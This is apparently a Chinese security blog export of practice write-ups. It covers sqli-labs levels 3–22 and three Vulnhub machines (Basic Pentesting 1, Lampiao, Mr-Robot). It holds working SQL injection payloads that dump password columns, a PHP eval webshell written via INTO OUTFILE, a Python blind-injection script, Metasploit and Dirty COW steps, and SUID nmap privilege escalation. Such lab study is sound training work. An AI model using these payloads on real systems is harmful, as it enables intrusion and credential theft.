<h2 id="3-Less-3带括号的字符串注入"><a href="#3-Less-3带括号的字符串注入" class="headerlink" title="3. Less-3带括号的字符串注入"></a>3. Less-3带括号的字符串注入</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215091012.png" alt="Less-3单引号报错"><br>当输入单引号，发现报错为<code>near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</code> ,去除左右两边的提示信息单引号。可以得到<code>&#39;1&#39;&#39;) LIMIT 0,1</code>,再将我们输入的单引号去除，又得<code>&#39;1&#39;) LIMIT 0,1</code>.不难看出实际上包括的结果为 (‘id’)。绕过只需要在正常的字符串注入后加上)即可。<br><code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39;) union select 1 , group_concat(username)  , 3 from users --+</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215091946.png" alt="Less-3完成">  </p>
<h2 id="4-Less-4双引号注入"><a href="#4-Less-4双引号注入" class="headerlink" title="4.Less-4双引号注入"></a>4.Less-4双引号注入</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215092432.png" alt="Less-4双引号报错"><br>当输入单引号时没有反应，尝试输入双引号。出现与第三关相同的报错，只是由单引号变为了双引号。因此注入方法与Less-3类似，在数字后加入双引号括号。<br><code>http://localhost/sqli-labs-master/Less-4?id=-1&quot;) union select 1 , group_concat(username)  , 3 from users --+</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215092615.png" alt="Less-4完成"></p>
<h2 id="5-Less-5报错注入"><a href="#5-Less-5报错注入" class="headerlink" title="5.Less-5报错注入"></a>5.Less-5报错注入</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216121849.png" alt="Less-5双注入"><br>可以发现，在第五关中没有关于输入id的回显。很轻松的将id使用单引号闭合后，使用双注入报错得到对应的信息。关于双注入可以参考<a href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">https://blog.werner.wiki/principle-of-double-injection-in-mysql/</a><br>但是我用双注入发现注释语句失效了，还是用的xpath报错完成的注入.<br><code>http://localhost/sqli-labs-master/Less-5/ ?id=872&#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) --+</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216131505.png" alt="Less-5完成">  </p>
<h2 id="6-Less-6双引号报错注入"><a href="#6-Less-6双引号报错注入" class="headerlink" title="6.Less-6双引号报错注入"></a>6.Less-6双引号报错注入</h2><p>与Less-5相同，不过使用双引号进行闭合。<br><code>http://localhost/sqli-labs-master/Less-6/ ?id=1&quot; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) --+</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216131739.png" alt="Less-6完成">  </p>
<h2 id="7-Less-7写入文件"><a href="#7-Less-7写入文件" class="headerlink" title="7.Less-7写入文件"></a>7.Less-7写入文件</h2><p>经过测试后，需要用<code>&#39;))</code>来闭合输入id。但是第7关没有回显，而且报错会用系统提示信息进行掩盖，无法进行报错注入。但是标题提示我们需要向系统写入文件。向系统写入文件需要使用into outfile 语句，同时需要知道当前写入位置的绝对路径。可以在前面的关卡使用@@basedir获得当恰数据库位置来猜测当前网站位置。<br>同时如果直接写入文件，会显示权限不够。还需要在mysql\my.ini中添加<code>secure_file_priv = </code><br>之后就可以成功写入文件。<br><code>http://localhost/sqli-labs-master/Less-7/ ?id=-1&#39;)) union select  1, 2,   &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy\\\www\\sqli-labs-master\\Less-7\\shell.php&quot;    --+</code><br>使用蚁剑连接如图<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216135204.png" alt="连接设置"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216135236.png" alt="连接成功图片">  </p>
<h2 id="8-Less-8布尔盲注"><a href="#8-Less-8布尔盲注" class="headerlink" title="8.Less-8布尔盲注"></a>8.Less-8布尔盲注</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211216135926.png" alt="Less-8"><br>测试后发现，id可以使用单引号闭合，但是没有报错信息，回显只有you are in ….和空。报错注入和联合查询都无法使用。但是有简单的正确提示信息you are in 可以使用布尔盲注。如果条件成立，则回显you are in 将会显示。贴上我第一次写的垃圾Python代码,第一个输入是SELECT 之后的语句，第二个是from之后的限制条件。如果不需要必须填为null  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode,quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlEncode</span>(<span class="params">cansu , content</span>):</span></span><br><span class="line">    payload=&#123;cansu:content&#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode(payload,quote_via=quote_plus)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">cansu, conn,body , poc,spe , op , imid </span>):</span></span><br><span class="line">    tpoc = poc + op + <span class="built_in">str</span>(imid)</span><br><span class="line">    tpoc += <span class="string">&quot;# &quot;</span></span><br><span class="line">    enCodetpoc = urlEncode(cansu, tpoc)</span><br><span class="line">    <span class="comment"># print(&quot;你具体的查询语句为:&quot; + tpoc+&quot;\n&quot;)</span></span><br><span class="line">    enCodetpoc = body + enCodetpoc</span><br><span class="line">    conn.request(<span class="string">&quot;GET&quot;</span>, enCodetpoc)</span><br><span class="line">    res = conn.getresponse()</span><br><span class="line">    <span class="comment"># print(res.status, res.reason)</span></span><br><span class="line">    data = res.read()</span><br><span class="line">    <span class="comment"># print(type(data))</span></span><br><span class="line">    data = data.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(data.find(spe)!=-<span class="number">1</span>): <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">len_inject</span>(<span class="params">conn, body, cansu, poc , content , table,  spe</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(table ==<span class="string">&quot;null&quot;</span>):</span><br><span class="line">        pos = poc.find(<span class="string">&quot;from&quot;</span>)</span><br><span class="line">        poc = poc[:pos]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        poc += table</span><br><span class="line">    poc += <span class="string">&quot;)&quot;</span></span><br><span class="line">    pos = poc.find(<span class="string">&quot;group_concat(&quot;</span>)</span><br><span class="line">    pos = pos + <span class="built_in">len</span>(<span class="string">&quot;group_concat(&quot;</span>)</span><br><span class="line">    poc = poc[:pos] + content + poc[pos:]</span><br><span class="line">    <span class="comment"># print(poc)</span></span><br><span class="line">    iL = <span class="number">0</span></span><br><span class="line">    iR = <span class="number">200</span></span><br><span class="line">    <span class="keyword">while</span>(iL&lt;=iR):</span><br><span class="line">        imid = <span class="built_in">int</span>((iL+iR)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span>(calc(cansu, conn,body , poc,spe , <span class="string">&quot;=&quot;</span>,imid )): <span class="keyword">return</span> imid</span><br><span class="line">        <span class="keyword">elif</span>(calc(cansu, conn,body , poc,spe , <span class="string">&quot;&gt;&quot;</span>,imid )): iL = imid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span>(calc(cansu, conn,body , poc,spe , <span class="string">&quot;&lt;&quot;</span>,imid )): iR = imid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">con_inject</span>(<span class="params">conn, body, cansu , poc, content, table , len_size , spe</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(table ==<span class="string">&quot;null&quot;</span>):</span><br><span class="line">        poc =  poc.replace(<span class="string">&quot;from&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos = poc.find(<span class="string">&quot;from &quot;</span>)</span><br><span class="line">        pos += <span class="built_in">len</span>(<span class="string">&quot;from &quot;</span>)</span><br><span class="line">        poc  = poc[:pos] + table + poc[pos:]</span><br><span class="line">    pos = poc.find(<span class="string">&quot;group_concat(&quot;</span>)</span><br><span class="line">    pos=pos + <span class="built_in">len</span>(<span class="string">&quot;group_concat(&quot;</span>)</span><br><span class="line">    poc = poc[:pos] + content + poc[pos:]</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> , len_size , <span class="number">1</span>):</span><br><span class="line">        tpoc = poc.replace(<span class="string">&quot;xyz&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="comment"># print(&quot;tpoc=&quot;+tpoc)</span></span><br><span class="line">        iL = <span class="number">0</span></span><br><span class="line">        iR = <span class="number">200</span></span><br><span class="line">        <span class="keyword">while</span>(iL&lt;=iR):</span><br><span class="line">            imid = <span class="built_in">int</span>((iL+iR)/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> (calc(cansu, conn, body, tpoc, spe, <span class="string">&quot;=&quot;</span>, imid)):</span><br><span class="line">                ans +=<span class="built_in">chr</span>(imid)</span><br><span class="line">                <span class="built_in">print</span>(ans + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> (calc(cansu, conn, body, tpoc, spe, <span class="string">&quot;&gt;&quot;</span>, imid)):</span><br><span class="line">                iL = imid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (calc(cansu, conn, body, tpoc, spe, <span class="string">&quot;&lt;&quot;</span>, imid)):</span><br><span class="line">                iR = imid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">injection</span>(<span class="params">content, table</span>):</span></span><br><span class="line">    url = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    body = <span class="string">&quot;/sqli-labs-master/Less-8/?&quot;</span></span><br><span class="line">    cansu = <span class="string">&quot;id&quot;</span></span><br><span class="line">    len_poc = <span class="string">&quot;1&#x27; and ( select length(group_concat()) from  &quot;</span></span><br><span class="line">    content_poc = <span class="string">&quot;1&#x27; and  ascii(substr((select group_concat() from  ) , xyz ,1 ))&quot;</span></span><br><span class="line">    spe = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">    conn = http.client.HTTPConnection(url)</span><br><span class="line">    len_size = len_inject(conn, body, cansu, len_poc , content , table,  spe)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你查询的字段长度为:&quot;</span>+<span class="built_in">str</span>(len_size)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    con_inject(conn, body, cansu , content_poc, content, table , len_size , spe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    options = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        content = <span class="built_in">input</span>(<span class="string">&quot;请输入查询内容:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        table = <span class="built_in">input</span>(<span class="string">&quot;请输入限定条件:&quot;</span>)</span><br><span class="line">        injection(content , table )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>最后查询的效果如下所示。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218091123.png" alt="Less-8完成"></p>
<h2 id="9-Less-9延时注入"><a href="#9-Less-9延时注入" class="headerlink" title="9.Less-9延时注入"></a>9.Less-9延时注入</h2><p>在第九关，当输入参数id之后无论是否加上引号或者之后的注释，页面都会显示You are in…. ，回显跟没有没什么区别。但是当使用单引号加上 and sleep(2)之后可以发现明显的延时。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218091846.png"><br>判断可以通过延时来注入。这里尝试使用BrupSuit来实现。这里有个坑，如果使用火狐浏览器需要将进入<code>about:config</code>搜索<code>network.proxy.allow_hijacking_localhost</code>，将其改为true，BrupSuit才能抓到本地的数据包。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218094156.png" alt="修改firefox设置"><br><code>http://localhost/sqli-labs-master/Less-9/?id=1‘ and  if(   substr((select group_concat(table_name) from information_schema.tables where table_schema = database()) , 1 , 1)=&#39;e&#39;    ,    sleep(4)     , 1    )  --+</code><br>我们抓到包后发送到intruder模块。   <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102405.png" alt="发送到intuder模块"><br>选择位置和字母作为选项，然后将模式改为Cluster Bomb。 <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102519.png" alt="设置位置参数"><br>在payloads中将playset1设置为1 到30 <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102628.png"><br>将playset2设置为Simpe list并在下方加入a-z<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102708.png"><br>之后点击start attack，将结果所有选项列表显示，按照Response receive排序，将4000ms以上高亮，然后只显示高亮并将结果按payload1排序。  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102912.png"><br>最终得到结果为 <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218102934.png"></p>
<h2 id="10-Less-10双引号延时注入"><a href="#10-Less-10双引号延时注入" class="headerlink" title="10.Less-10双引号延时注入"></a>10.Less-10双引号延时注入</h2><p>与第9关相同，不同是使用双引号闭合参数。<code>http://localhost/sqli-labs-master/Less-9/?id=1“ and  if(   substr((select group_concat(table_name) from information_schema.tables where table_schema = database()) , 1 , 1)=&#39;e&#39;    ,    sleep(4)     , 1    )  --+</code></p>
<h2 id="11-Less-11登录中报错注入"><a href="#11-Less-11登录中报错注入" class="headerlink" title="11.Less-11登录中报错注入"></a>11.Less-11登录中报错注入</h2><p>第11关为登录，在username中输入单引号后有错误回显提示，可以使用报错注入。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218103655.png"><br>帐号输入<code>872&#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) # </code><br>密码随便输入<br>得到结果<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218104024.png" alt="登录报错注入结果">  </p>
<h2 id="12-Less-12"><a href="#12-Less-12" class="headerlink" title="12.Less-12"></a>12.Less-12</h2><p>与第11关类似不过使用 <code>&quot;)</code>来闭合输入参数。<br>帐号:<code>872&quot;) and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) #</code><br>密码随便输入<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218104741.png" alt="Less-12完成"></p>
<h2 id="13-Less-13"><a href="#13-Less-13" class="headerlink" title="13.Less-13"></a>13.Less-13</h2><p>在密码使用<code>&#39;)</code>闭合参数，报错注入<br>帐号:随便<br>密码:<code>872’) and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) #</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218105448.png"></p>
<h2 id="14-Less-14"><a href="#14-Less-14" class="headerlink" title="14.Less-14"></a>14.Less-14</h2><p>与13关类似,不过在密码使用<code>&quot;</code>闭合输入参数。<br>帐号:随便<br>密码:<code>872&quot; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) #</code></p>
<h2 id="15-Less-15登录盲注"><a href="#15-Less-15登录盲注" class="headerlink" title="15.Less-15登录盲注"></a>15.Less-15登录盲注</h2><p>这次的登录框没有错误回显，只有登录成功和登录失败。可以使用前面的帐号dumb密码dumb。通过这个登录成功和登录失败的页面完成布尔盲注。<br>帐号:<code>dumb</code><br>密码:<code>dumb&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()) , 1 , 1)=&#39;e&#39;  # </code><br>回显登录成功<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218111201.png" alt="盲注登录成功回显"><br>密码:<code>dumb&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()) , 1 , 1)=&#39;a&#39;  # </code><br>回显登录失败<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218111257.png" alt="盲注登录失败回显">  </p>
<h2 id="16-Less-16"><a href="#16-Less-16" class="headerlink" title="16.Less-16"></a>16.Less-16</h2><p>与15关类似不过使用<code>&quot;)</code>完成闭合。  </p>
<h2 id="17-Less-17更新密码"><a href="#17-Less-17更新密码" class="headerlink" title="17.Less-17更新密码"></a>17.Less-17更新密码</h2><p>使用之前的用户名，但是在密码处可以使用<code>&#39;</code>闭合参数进行错误注入。但是如果直接使用之前的语句<code>select group_concat(password) from users</code>会出现报错。 <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218115511.png">。这是因为对同一张表同时进行了更新和查询，要解决这个问题只需要在多添加一次查询，出现一张中间表作为临时表。参考:<a href="https://blog.csdn.net/z_youarethebest/article/details/53785487">https://blog.csdn.net/z_youarethebest/article/details/53785487</a><br>帐号:<code>dumb</code><br>密码:<code>dumb&#39;   and updatexml(1, concat(&#39;^&#39;,(select  * from (select group_concat(password) from users)xyz ) ,&#39;^&#39;) , 1) #</code><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218115807.png" alt="Less-17完成">  </p>
<h2 id="18-Less-18-User-agent注入"><a href="#18-Less-18-User-agent注入" class="headerlink" title="18.Less-18 User-agent注入"></a>18.Less-18 User-agent注入</h2><p>登录之后会显示user-agent 和 ip 如果 登录失败，只显示ip。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218122511.png" alt="登录成功">登录成功之后猜想可以在user-agnet进行注入。<br>抓包之后修改user-agent模块为<code>User-Agent:  &#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) and &#39;1&#39; = &#39;1 </code><br>或者<code>User-Agent:  &#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) , &#39;&#39;,&#39;&#39;) # </code>可以完成注入<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218122625.png" alt="注入成功"></p>
<h2 id="19-Less-19-Refer注入"><a href="#19-Less-19-Refer注入" class="headerlink" title="19.Less-19 Refer注入"></a>19.Less-19 Refer注入</h2><p>与上一关几乎一样，抓包后修改refer即可。<code>Referer:  &#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1) , &#39;&#39;,&#39;&#39;) # </code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218122911.png" alt="Less-19完成"></p>
<h2 id="20-Less-20-Cookie注入"><a href="#20-Less-20-Cookie注入" class="headerlink" title="20.Less-20 Cookie注入"></a>20.Less-20 Cookie注入</h2><p>用户登录之后显示一系列信息,同时下方有一个删除cookie的提交按钮。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218125457.png" alt="Less-20信息"><br>当点击按钮之后，删除Cookie并需要重新登录。猜想和前两关相同不过是从Cookie处实现注入。使用BrupSuit抓包后发现除了开始的用户名密码POST表单一个HTTP包之后，还抓到一个提交Cookie的数据包。 <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218125826.png" alt="Cookie数据包"><br>在这个数据包修改Cookiex信息实现Cookie注入。<br><code>Cookie: uname=Dumb&#39; and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1)  # </code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218125936.png" alt="Less-20完成"></p>
<h2 id="21-Less-21-Base64Cookie注入"><a href="#21-Less-21-Base64Cookie注入" class="headerlink" title="21.Less-21 Base64Cookie注入"></a>21.Less-21 Base64Cookie注入</h2><p>这一次基本步骤与上次一样，不同的是Cookie显示为RHVtYg==。使用base64解码后发现就是Dumb。因此猜测传入的Cookie的值先进行一次Base64解码后才进行sql操作，我们将<code>dumb&#39;</code>进行base64编码后，写入数据包。得到结果为<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218131442.png"><br>由此可以得到应该使用<code>&#39;)</code>进行闭合。<br>最后将<code>dumb&#39;) and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1)  # </code>进行base64编码得到<code>ZHVtYicpIGFuZCB1cGRhdGV4bWwoMSwgY29uY2F0KCdeJywoc2VsZWN0ICBncm91cF9jb25jYXQocGFzc3dvcmQpICBmcm9tIHVzZXJzICkgLCdeJykgLCAxKSAgIyA=</code><br>修改数据包最后得到<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218131715.png" alt="Less-21完成"></p>
<h2 id="22-Less-22"><a href="#22-Less-22" class="headerlink" title="22.Less-22"></a>22.Less-22</h2><p>与上一关一样不过使用<code>&quot;</code>进行闭合。对<code>dumb&quot;  and updatexml(1, concat(&#39;^&#39;,(select  group_concat(password)  from users ) ,&#39;^&#39;) , 1)  # </code>进行base64编码得到<code>ZHVtYiIgIGFuZCB1cGRhdGV4bWwoMSwgY29uY2F0KCdeJywoc2VsZWN0ICBncm91cF9jb25jYXQocGFzc3dvcmQpICBmcm9tIHVzZXJzICkgLCdeJykgLCAxKSAgIyA=</code>。传入后成功注入<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211218132303.png" alt="Less-22"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>basic_pentesting_1靶机</title>
    <url>/2021/12/19/basic-pentesting-1%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="BASIC-PENTESTING-1靶机"><a href="#BASIC-PENTESTING-1靶机" class="headerlink" title="BASIC PENTESTING: 1靶机"></a>BASIC PENTESTING: 1靶机</h1><span id="more"></span>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>下载地址 <a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/">BASIC PENTESTING: 1</a><br>目标:获得root权限  </p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap扫出开放21ftp , 22ssh, 80web端口。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219145523.png" alt="端口扫描结果"><br>21 ftp端口使用 proftpd 1.3.3c协议，使用msf扫描发现可以使用的exp<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219145713.png" alt="msf扫描结果"><br>使用扫描结果然后查看选项，需要填写目标ip<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219145820.png" alt="options"><br>设置目标ip <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219145855.png"><br>设置paylaod 以及 payload选项<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219150401.png"><br>运行后获得root权限<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211219150516.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>Lampiao靶机</title>
    <url>/2021/12/20/Lampiao%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="Lampiao靶机"><a href="#Lampiao靶机" class="headerlink" title="Lampiao靶机"></a>Lampiao靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">下载地址</a><br>目标:获得root权限</p>
<span id="more"></span>


<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap获得靶机信息<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220083440.png" alt="靶机信息"><br>除了22  80 端口还开放了一个1898端口。在80端口上只有一个静态网页，没有可用的信息。到1898端口上查看。使用dirb扫描后，发现robots.txt文件。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092046.png" alt="dirb结果"><br>进入robots.txt文件，发现禁止爬取的文件中有CHANGELOG.txt.<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092155.png"><br>进入Changelog.txt文件发现，该网站为 Drupal的cms。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092245.png"><br>进入msf查看是否存在可以利用的exp。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093240.png"><br>使用<code>exploit/unix/webapp/drupal_drupalgeddon2 </code>，并设置参数后运行。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093340.png" alt="msf参数"><br>成功后输入<code>shell</code>获得www-data权限。<br>在<code>/var/www/html/sites/default/settings.php</code>文件中获得数据库连接帐号:drupaluser, 密码:Virgulino.在home文件夹中发现存在用户tiago<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093801.png"><br>使用数据库连接密码连接tiago帐号成功。<br>使用脏牛提权的条件为<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220094023.png" alt="脏牛提权"><br>通过<code>uname -a</code>查看当前版本符合脏牛提权条件。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220094128.png" alt="当前系统版本"><br><code>tar -czvf dcow.tar.gz CVE-2016-5195-master</code>压缩文件夹。<br>通过nc传输文件<br>靶机<code>nc -l 4444 &gt; dcow.tar.gz</code><br>攻击机<code>nc 10.1.1.133 4444 &lt; dcow.tar.gz</code><br>靶机使用<code>tar -xzvf dcow.tar.gz</code>解压文件夹后，进入文件夹。使用<code>make</code>指令生产dcow可执行文件，运行后获得root权限。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>Linux提权</tag>
        <tag>脏牛提权</tag>
      </tags>
  </entry>
  <entry>
    <title>mr-Robot靶机</title>
    <url>/2021/12/21/mr-Robot%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="MR-ROBOT-1靶机"><a href="#MR-ROBOT-1靶机" class="headerlink" title="MR-ROBOT: 1靶机"></a>MR-ROBOT: 1靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">下载地址</a><br>目标: 找到三个flag</p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap扫描结果<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221121525.png" alt="扫描结果"><br>开放 80  , 443端口。进入80端口，web页面是一个仿bash的页面。没有什么信息，先用dirb扫描。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221133226.png" alt="dirb扫描结果"><br>进入/0页面和/login页面发现是一个wordpress博客。进入rotbos爬虫页面发现禁止爬取 fsocity.dic, key-1-of-3.txt<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221133428.png"><br>进入/key-1-of-3.txt获得第一个flag。在fsocity.dic中是一个字典文件<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221133601.png"><br>将字典文件保存，使用<code>sort -u fsocity.dic &gt; dic.txt</code>将字典去重排序。同时使用BrupSuit的intruder模块将用户名单独作为paylaod进行爆破。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221134022.png"><br>可以通过Response长度发现对于<code>elliot</code>用户名，系统返回值为该用户名密码不正确，由此可以得到 博客用户名为<code>Elliot</code>。同理将<code>Elliot</code>作为用户名将密码作为payload进行爆破。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221134150.png"><br>通过长度和状态码可以得到密码为<code>ER28-0652</code>。通过登录后台修改404页面为shell，同时反弹shell。可以获得靶机的用户作为<code>daemon</code>的权限。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221134447.png"><br>home中有用户robot，robot中含有文件key-2-of-3.txt和password.raw-md5。尝试查看 key文件提示权限不足，但是passwod.md5文件可以查看。于是通过将md5文件解密得到密码为<code>abcdefghijklmnopqrstuvwxyz</code>。使用robot用户获得第2个flag.  接着使用SUID进行提权<br>SUID是指具有root执行权限的程序.</p>
<ol>
<li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>  查找具有suid的可执行文件   </li>
<li>已知可提权的程序有 Nmap , Vim, find ,bash , More ,Less , Nano, cp</li>
<li>通过搜索发现有namap，nmap 在 2.02 -5.21版本可以提权<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221135536.png"></li>
<li><code>nmap --interactive</code>进入nmap 交互模式</li>
<li><code>!sh</code> 使用root权限进入shell   </li>
</ol>
